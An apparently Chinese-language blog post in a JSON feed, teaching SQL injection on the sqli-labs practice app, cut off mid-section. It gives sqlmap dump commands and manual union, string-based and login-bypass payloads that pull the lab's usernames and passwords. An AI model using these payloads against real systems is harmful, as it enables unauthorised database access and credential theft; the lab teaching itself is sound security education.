{
    "version": "https://jsonfeed.org/version/1",
    "title": "Hexo • All posts by \"sql injection\" tag",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2022/03/16/SQL%E6%B3%A8%E5%85%A5/",
            "url": "http://example.com/2022/03/16/SQL%E6%B3%A8%E5%85%A5/",
            "title": "SQL injection",
            "date_published": "2022-03-16T05:38:45.000Z",
            "content_html": "<h1 id=\"sql注入\"><a class=\"markdownIt-Anchor\" href=\"#sql注入\">#</a> SQL 注入</h1>\n<h3 id=\"1sqli-labs-master-安装\"><a class=\"markdownIt-Anchor\" href=\"#1sqli-labs-master-安装\">#</a> 1.sqli-labs-master 安装</h3>\n<p>下面在 linux 中安装，虚拟机地址为 192.168.1.155，端口号为 18888，使用宝塔面板</p>\n<h4 id=\"1将sqli-labs-master移动到网站根目录下解压\"><a class=\"markdownIt-Anchor\" href=\"#1将sqli-labs-master移动到网站根目录下解压\">#</a> 1. 将 sqli-labs-master 移动到网站根目录下，解压</h4>\n<p><code>unzip sqli-labs-master</code></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1639469835321-5363494e-a8b7-4796-99a0-97f475cef370.png\" alt=\"img\"></p>\n<h4 id=\"2修改配置文件配合文件为sqlisql-connectionsdb-credsinc\"><a class=\"markdownIt-Anchor\" href=\"#2修改配置文件配合文件为sqlisql-connectionsdb-credsinc\">#</a> 2. 修改配置文件，配合文件为： <code>sqli/sql-connections/db-creds.inc</code></h4>\n<p><code>vim sqli/sql-connections/db-creds.inc</code></p>\n<p>数据库用户名和密码在宝塔面板中可以修改</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1639469904204-6c29948a-2cdc-4f11-8e01-58f8ed2dbe83.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1639469999346-dca351bf-b5d0-4a51-9ff1-dab559edf120.png\" alt=\"img\"></p>\n<h4 id=\"3浏览器打开输入对应的文件路径安装数据库如果第二步有错此步将不能正常执行\"><a class=\"markdownIt-Anchor\" href=\"#3浏览器打开输入对应的文件路径安装数据库如果第二步有错此步将不能正常执行\">#</a> 3. 浏览器打开，输入对应的文件路径，安装数据库，如果第二步有错，此步将不能正常执行</h4>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1639470033800-7e58d43a-1835-4303-906c-05a0d03dd762.png\" alt=\"img\"></p>\n<h4 id=\"4验证安装完成后即可按到如下界面\"><a class=\"markdownIt-Anchor\" href=\"#4验证安装完成后即可按到如下界面\">#</a> 4. 验证安装完成后，即可按到如下界面</h4>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1639470107086-065656d0-7044-4c09-9323-5e799f726534.png\" alt=\"img\"></p>\n<h3 id=\"2sqlmap-安装与使用\"><a class=\"markdownIt-Anchor\" href=\"#2sqlmap-安装与使用\">#</a> 2.sqlmap 安装与使用</h3>\n<h4 id=\"1kali联网\"><a class=\"markdownIt-Anchor\" href=\"#1kali联网\">#</a> 1.kali 联网</h4>\n<p>选择桥接时，只需要将虚拟机和物理主机 ip 置于一个网段中</p>\n<p>如果不能联网，修改 <code>/etc/network/interfaces</code>   ，设置 ip，网关，掩码</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">source</span> /etc/network/interfaces.d/*</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># The loopback network interface**</span></span><br><span class=\"line\">auto lo</span><br><span class=\"line\">iface lo inet loopback</span><br><span class=\"line\"></span><br><span class=\"line\">auto eth0</span><br><span class=\"line\"></span><br><span class=\"line\">iface eth0 inet static</span><br><span class=\"line\">address 192.168.0.66</span><br><span class=\"line\">gateway 192.168.1.1</span><br><span class=\"line\">netmask 255.255.254.0</span><br></pre></td></tr></table></figure>\n<h4 id=\"2修改dns-etcresolvconf\"><a class=\"markdownIt-Anchor\" href=\"#2修改dns-etcresolvconf\">#</a> 2. 修改 DNS，  <code>/etc/resolv.conf</code></h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nameserver 8.8.8.8</span><br><span class=\"line\">nameserver 114.114.114.114</span><br><span class=\"line\">search localdomain</span><br></pre></td></tr></table></figure>\n<h4 id=\"3重启网络服务\"><a class=\"markdownIt-Anchor\" href=\"#3重启网络服务\">#</a> 3. 重启网络服务</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/etc/init.d/networking restart</span><br><span class=\"line\"></span><br><span class=\"line\">service networking restart </span><br></pre></td></tr></table></figure>\n<h4 id=\"4sqlmap使用\"><a class=\"markdownIt-Anchor\" href=\"#4sqlmap使用\">#</a> 4.sqlmap 使用</h4>\n<p>下载：Github：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NxbG1hcHByb2plY3Qvc3FsbWFw\">https://github.com/sqlmapproject/sqlmap</span></p>\n<h4 id=\"5sqlmap支持的注入技术\"><a class=\"markdownIt-Anchor\" href=\"#5sqlmap支持的注入技术\">#</a> 5.SQLMAP 支持的注入技术</h4>\n<p>​\t基于布尔的盲注：根据返回页面判断条件真假的注入。</p>\n<p>​\t基于时间的盲注：不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语 句是否执行（即页面返回时间是否增加）来判断。</p>\n<p>​\t基于报错的注入：页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p>\n<p>​\t基于联合查询的注入：可以使用 UNION 的情况下的注入。</p>\n<p>​\t堆查询注入：同时执行多条语句的注入。</p>\n<h4 id=\"6sqlmap支持的数据库类型\"><a class=\"markdownIt-Anchor\" href=\"#6sqlmap支持的数据库类型\">#</a> 6.SQLMAP 支持的数据库类型</h4>\n<p>​\t主要包括一些关系型数据库（ RMDBS ） ， 如 MySQL 、Oracle 、PostgreSQL 、 Microsoft SQL Server 、Microsoft Access 、IBM DB2 、SQLite 、Firebird 、 Sybase、SAP MaxDB、Informix、HSQLDB 等</p>\n<h4 id=\"7sqlmap用法以下用windows演示\"><a class=\"markdownIt-Anchor\" href=\"#7sqlmap用法以下用windows演示\">#</a> 7.sqlmap 用法 (以下用 Windows 演示)</h4>\n<h4 id=\"71对于get请求爆破方式\"><a class=\"markdownIt-Anchor\" href=\"#71对于get请求爆破方式\">#</a> 7.1 对于 get 请求爆破方式</h4>\n<p>1.sqlmap -u URL</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x\">http://192.168.1.4:18888/sqli/Less-1/?id=1</span></p>\n<p>判断可注入的参数</p>\n<p>判断可以用哪种 SQL 注入技术来注入</p>\n<p>识别出所有存在的注入类型</p>\n<p>尝试去判定数据库版本、开发语言、操作系统版本</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213182954882.png\" alt=\"image-20220213182954882\"></p>\n<p>2.sqlmap -u URL --current-db 获得数据库名</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x\">http://192.168.1.4:18888/sqli/Less-1/?id=1</span> --current-db</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213183117274.png\" alt=\"image-20220213183117274\"></p>\n<p>3.sqlmap -u URL -D database --tables  获得数据库中表名</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x\">http://192.168.1.4:18888/sqli/Less-1/?id=1</span> -D security --tables</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213183308240.png\" alt=\"image-20220213183308240\"></p>\n<p>4.sqlmap -u URL -D database -T tables --columns 获得表中字段名</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x\">http://192.168.1.4:18888/sqli/Less-1/?id=1</span> -D security -T users --columns</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213183454058.png\" alt=\"image-20220213183454058\"></p>\n<p>5.sqlmap -u URL -D database -T users -C name1,name2,name3 --dump 获取每个字段中的数据</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x\">http://192.168.1.4:18888/sqli/Less-1/?id=1</span> -D security -T users -C password,username --dump</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213183651064.png\" alt=\"image-20220213183651064\"></p>\n<h4 id=\"72对于post请求爆破方式\"><a class=\"markdownIt-Anchor\" href=\"#72对于post请求爆破方式\">#</a> 7.2 对于 post 请求爆破方式</h4>\n<p>1. 保存文件方式  sqlmap -r x.txt</p>\n<p>先使用 BurpSuite 抓包，将获取内容保存到指定文件，下面将文件保存到 E://1.txt</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span>  -r E:\\1.txt</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213183936861.png\" alt=\"image-20220213183936861\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213184049162.png\" alt=\"\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213184622656.png\" alt=\"image-20220213184622656\"></p>\n<p>2. 手动输入 post 参数方式  sqlmap -u URL --data “”</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span>  -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xNy9pbmRleC5waHA=\">http://192.168.1.4:18888/sqli/Less-17/index.php</span> --data “uname=admin&amp;passwd=admin&amp;submit=Submit” --current-db</p>\n<p>3. 自动搜索 post 参数方式</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span>  -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xNy9pbmRleC5waHA=\">http://192.168.1.4:18888/sqli/Less-17/index.php</span> --forms</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213185639194.png\" alt=\"image-20220213185639194\"></p>\n<h4 id=\"73对于一些较难注入的场景\"><a class=\"markdownIt-Anchor\" href=\"#73对于一些较难注入的场景\">#</a> 7.3 对于一些较难注入的场景</h4>\n<p>通过指定 level 设置，一共包含五个等级</p>\n<p>level=2 http cookie 会测试</p>\n<p>level=3 http user-agent/referer 头会测试</p>\n<p>level=5 包含的 payload 最多，会自动破解出 cookie、XFF 等头部注入，相对应他的速度也比较慢。</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x\">http://192.168.1.4:18888/sqli/Less-1/?id=1</span> level 5</p>\n<h3 id=\"使用awvs-进行sql-inject扫描\"><a class=\"markdownIt-Anchor\" href=\"#使用awvs-进行sql-inject扫描\">#</a> 使用 AWVS 进行 sql inject 扫描</h3>\n<p>安装过程不在描述，使用 add target 输入要扫描的地址</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305141924499.png\" alt=\"image-20220305141924499\"></p>\n<p>选择扫描速度</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142112656.png\" alt=\"image-20220305142112656\"></p>\n<p>设置 user-agent 伪装</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142142802.png\" alt=\"image-20220305142142802\"></p>\n<p>可以联动被动扫描器如 xray 进行多次扫描，</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142228843.png\" alt=\"image-20220305142228843\"></p>\n<p>选择 scan</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142305286.png\" alt=\"image-20220305142305286\"></p>\n<p>发现 sql 注入，存在盲注</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142353893.png\" alt=\"image-20220305142353893\"></p>\n<p>点击可以查看详细信息和扫描过程</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142445896.png\" alt=\"image-20220305142445896\"></p>\n<h3 id=\"3sql注入基础\"><a class=\"markdownIt-Anchor\" href=\"#3sql注入基础\">#</a> 3.SQL 注入基础</h3>\n<h4 id=\"31sql前置知识\"><a class=\"markdownIt-Anchor\" href=\"#31sql前置知识\">#</a> 3.1SQL 前置知识</h4>\n<p>1.mysql 查询方式</p>\n<p>mysql 注入主要关注 MYSQL 系统数据库 <code>information_schema</code> ，关注系统数据库的表 <code>columns</code>  和 <code>schemata</code>  表以及 <code>tables</code>  表</p>\n<p><code>SCHEMATA</code>  表：提供了关于数据库的信息</p>\n<p>desc information_schema.schemata;</p>\n<p>select distinct schema_name from schemata;</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213191251636.png\" alt=\"image-20220213191251636\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213191345456.png\" alt=\"image-20220213191345456\"></p>\n<p><code>COLUMNS</code>  表：给出了表中的列信息</p>\n<p>desc information_schema.columns;</p>\n<p>select distinct column_name from information_schema.columns</p>\n<p><code>TABLES</code>  表：给出了关于数据库中的表的信息</p>\n<p>desc information_schema.tables;</p>\n<p>select distinct table_name from information_schema.tables;</p>\n<p><strong>即可以使用的查询语句为</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.select distinct schema_name from schemata; 获取数据库名(或使用函数select database();)</span><br><span class=\"line\"></span><br><span class=\"line\">2.select table_name from information_schema.tables where table_schema=&#x27;security&#x27;; 获取表名</span><br><span class=\"line\"></span><br><span class=\"line\">3.select column_name  from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;;  获取列名</span><br><span class=\"line\"></span><br><span class=\"line\">4.select username from users;  获取数据</span><br></pre></td></tr></table></figure>\n<p>2.mysql 函数</p>\n<p>常用的 mysql 函数有：</p>\n<p><code>user()</code>  用户名</p>\n<p><code>database()</code>  数据库名</p>\n<p><code>version()</code>  mysql 数据库版本</p>\n<p><code>load_file()</code>  mysql 读取本地文件的函数</p>\n<p><code>@@datadir</code>   数据库路径</p>\n<p>3.sql 常用注释</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213193633629.png\" alt=\"image-20220213193633629\"></p>\n<h4 id=\"32sql注入定义\"><a class=\"markdownIt-Anchor\" href=\"#32sql注入定义\">#</a> 3.2SQL 注入定义</h4>\n<p>SQL Injection：就是通过把 SQL 命令插入到 Web 表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令。</p>\n<p>本质因为输入的数据和代码不进行区分</p>\n<p>成因未对用户提交的参数数据进行校验或有效的过滤，直接进行 SQL 语句的拼接，改变了原有 SQL 语句的语义，传进数据库解析引擎中执行。</p>\n<p>所有的输入只要和数据库进行交互的，都有可能触发 SQL 注入</p>\n<p>常见的包括：</p>\n<p>Get 参数触发 SQL 注入</p>\n<p>POST 参数触发 SQL 注入</p>\n<p>Cookie 触发 SQL 注入</p>\n<p>其他参与 sql 执行的输入都有可能进行 SQL 注入</p>\n<p>两个条件</p>\n<p>用户能够控制输入</p>\n<p>原本程序要执行的 SQL 语句，拼接了用户输入的恶意数据</p>\n<h4 id=\"32mysql注入分类\"><a class=\"markdownIt-Anchor\" href=\"#32mysql注入分类\">#</a> 3.2mysql 注入分类</h4>\n<p>1. 按照请求方法注入</p>\n<p>​\tget 型注入</p>\n<p>​\tpost 型注入</p>\n<p>2. 按照 SQL 数据类型分类</p>\n<p>​\t整形注入</p>\n<p>​\t字符型注入</p>\n<p>3. 其他类型数据类型</p>\n<p>​\t报错注入</p>\n<p>​\t双注入</p>\n<p>​\t布尔盲注</p>\n<p>​\t时间盲注</p>\n<p>​\tCookie 注入</p>\n<p>​\tUser-Agent 注入</p>\n<p><strong>手工注入过程</strong></p>\n<p>1 判断是否存在注入点；</p>\n<p>2 判断字段长度（字段数）；</p>\n<p>3 判断字段回显位置；</p>\n<p>4 判断数据库信息；</p>\n<p>5 查找数据库名；</p>\n<p>6 查找数据库表；</p>\n<p>7 查找数据库表中所有字段以及字段值；</p>\n<p>8 猜解账号密码；</p>\n<p>9 登录管理员后台。</p>\n<h5 id=\"万能密码\"><a class=\"markdownIt-Anchor\" href=\"#万能密码\">#</a> 万能密码</h5>\n<p>select * from users where  username=&quot;&quot; or 1=1 --+</p>\n<p>通过 or 的 1=1 恒为真，密码被注释，此时相当于 select * from users;</p>\n<h5 id=\"整形注入\"><a class=\"markdownIt-Anchor\" href=\"#整形注入\">#</a> 整形注入</h5>\n<p>1. 判断是否由注入 (是否未严格校验)— 第一要素</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">可控参数改变 (类似于?id=1,2,3,4) 能否影响页面结果</span><br><span class=\"line\">输入的SQL语句是否能报错，通过数据库报错看到数据库一些语句的痕迹</span><br><span class=\"line\">?id=1&#x27;   报错说明是整形注入 &#x27;</span><br><span class=\"line\">输入的SQL语句能否不报错，语句是否可以成功闭合</span><br><span class=\"line\">information_schema 包含当前数据库表名</span><br><span class=\"line\">tables 数据库中所有表，通过table_schema 和table_name 确定</span><br><span class=\"line\">通过union同时执行两条语句，但需要保证前一个表和后一个表字段数一样</span><br><span class=\"line\">因此需要判断前一个表有几列</span><br><span class=\"line\">通过#或者--+ 将后面的语句注释，使其只执行前面的语句，通过HTML实体编码将其编码#---%23</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=4 union select 1,2,3,4 #</span><br><span class=\"line\">如果提示有different columns，说明不匹配，可以使用枚举</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=4 union select 1,2,3 # </span><br><span class=\"line\">这里的1,2,3只是用于占位</span><br><span class=\"line\">将id改为前表不存在的值，使其查询结果不显示前表，同时可以查出回显位置</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,2,3 # </span><br><span class=\"line\">将后面占位符改为需要查询的语句，同时可以调换位置使其输出在正确的位置</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,user(),3 %23</span><br><span class=\"line\">寻找数据库名字</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,schema_name,3 from information_schema.schemata %23</span><br><span class=\"line\">此时只能查询出一条语句，可以使用group_concat()拼接不同列的数据</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata %23</span><br><span class=\"line\">查询当前数据库</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,database(),3  %23</span><br><span class=\"line\">查询当前数据有有哪些表，可以使用group_concat或concat,使用concat需要使用limit限制每次出数据的个数</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,group_concat(table,name),3 from information_schema.tables where table_schema = database() %23</span><br><span class=\"line\">查询表有哪些字段</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns  where table_schema = database() and table_name=&#x27;users&#x27; %23</span><br><span class=\"line\">查询用户名密码</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1, group_concat(username),group_concat(password) from security.users %23</span><br><span class=\"line\">以human_read输出user_name和password</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1, group_concat(concat_ws(&#x27;:&#x27;,username,password)),3 from security.users %23</span><br></pre></td></tr></table></figure>\n<p>2. 什么类型注入</p>\n<p>3. 语句是否能够被恶意修改 — 第二要素</p>\n<p>4. 是否能够成功执行 — 第三要素</p>\n<p>5. 获取想要数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.判断是否是整形注入，即加&#x27;判断是否可以闭合&#x27;</span><br><span class=\"line\">2.判断输入是否可以影响输出 ?id=1 and 0  ?id=1 and 1 尝试使其不报错</span><br><span class=\"line\">3.判断表有几列 union select 1,2,3 %23 或者使用order by ，按照第x列排序，可以使用二分法依次查找列数</span><br><span class=\"line\">4.使用?id=1 and 0 union select 1,2,3 %23，其中1,2,3可以用需要查询的信息替换 database()</span><br><span class=\"line\">5.查询表的详细信息?id=1 and 0 union select 1,group_concat(table_name),3  from information_schema.tables where table_schema = database() %23</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><strong>order by 探测列名原理：</strong></p>\n<p><strong>order by 后可以加列名，列号。比如 order by 3，按照第三列排序，因此如果第三列不存在会报错，我们可以利用这点探测列数</strong></p>\n<h5 id=\"字符型注入\"><a class=\"markdownIt-Anchor\" href=\"#字符型注入\">#</a> 字符型注入</h5>\n<p>和数字型区别：接收的参数是否有’’ ,id='<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>i</mi><msup><mi>d</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mtext>字符型，</mtext><mi>i</mi><mi>d</mi><mo>=</mo></mrow><annotation encoding=\"application/x-tex\">id&#x27;字符型，id=</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.751892em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">i</span><span class=\"mord\"><span class=\"mord mathnormal\">d</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mord cjk_fallback\">字</span><span class=\"mord cjk_fallback\">符</span><span class=\"mord cjk_fallback\">型</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">d</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span></span></span></span>id 数字型</p>\n<p>也可以通过报错信息查看，如果在 limit 附近报错，说明是数字型，如果在 $id 中报错说明是字符型，因为多了一个’</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.使用order by判断列数</span><br><span class=\"line\">?id=1&#x27; order by 3 --+</span><br><span class=\"line\">2.使用联合查询</span><br><span class=\"line\">?id=-1&#x27; union select 1,(select user()),(select database()) --+ </span><br><span class=\"line\">Welcome    Dhakkan</span><br><span class=\"line\">Your Login name:root@localhost</span><br><span class=\"line\">Your Password:security</span><br><span class=\"line\"></span><br><span class=\"line\">3.查找数据库中有几张表</span><br><span class=\"line\">?id=-1&#x27; union select 1,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27;),(select database()) --+ </span><br><span class=\"line\">提示超出一行</span><br><span class=\"line\">可以使用limit 0,1，此时报出第一张表名</span><br><span class=\"line\">或者使用group_concat</span><br><span class=\"line\">?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),(select database()) --+ </span><br><span class=\"line\">Welcome    Dhakkan</span><br><span class=\"line\">Your Login name:emails,referers,uagents,users</span><br><span class=\"line\">Your Password:security</span><br><span class=\"line\"></span><br><span class=\"line\">4.查找列名</span><br><span class=\"line\">?id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;),(select database()) --+ </span><br><span class=\"line\">Welcome    Dhakkan</span><br><span class=\"line\">Your Login name:id,username,password</span><br><span class=\"line\">Your Password:security</span><br><span class=\"line\"></span><br><span class=\"line\">4.查找password</span><br><span class=\"line\">?id=-1&#x27; union select 1,(select group_concat(username,0x3a,password) from users),(select database()) --+</span><br><span class=\"line\">Welcome    Dhakkan</span><br><span class=\"line\">Your Login name:Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4</span><br><span class=\"line\">Your Password:security</span><br></pre></td></tr></table></figure>\n<p>当输入参数为字符串时，称为字符型。数字型与字符型注入最大的区别在于：数字型不需要单引号闭合，而字符串类型一般要使用单引号来闭合。</p>\n<p>字符型：select * from table where username=‘test’</p>\n<p>字符型注入最关键的是如何闭合 SQL 语句以及注释多余的代码</p>\n<p>查询内容为字符串时：select * from table where username = ‘test’</p>\n<p>测试：</p>\n<p>select * from table where username = ‘test and 1=1’ ，无法注入，“test and 1=1” 会被数据库当作查询的字符串</p>\n<p>select * from table where username = ‘test’ and ‘1’='1’ --’，必须闭合字符串才可以继续注入</p>\n<h5 id=\"报错注入\"><a class=\"markdownIt-Anchor\" href=\"#报错注入\">#</a> 报错注入</h5>\n<p>查询错误会输出相应的错误，查询正确没有对应输出</p>\n<h6 id=\"1st_latfromgeohashmysql57x\"><a class=\"markdownIt-Anchor\" href=\"#1st_latfromgeohashmysql57x\">#</a> 1.ST_LatFromGeoHash()（mysql&gt;=5.7.x）</h6>\n<p>计算纬度 hash 报错</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td 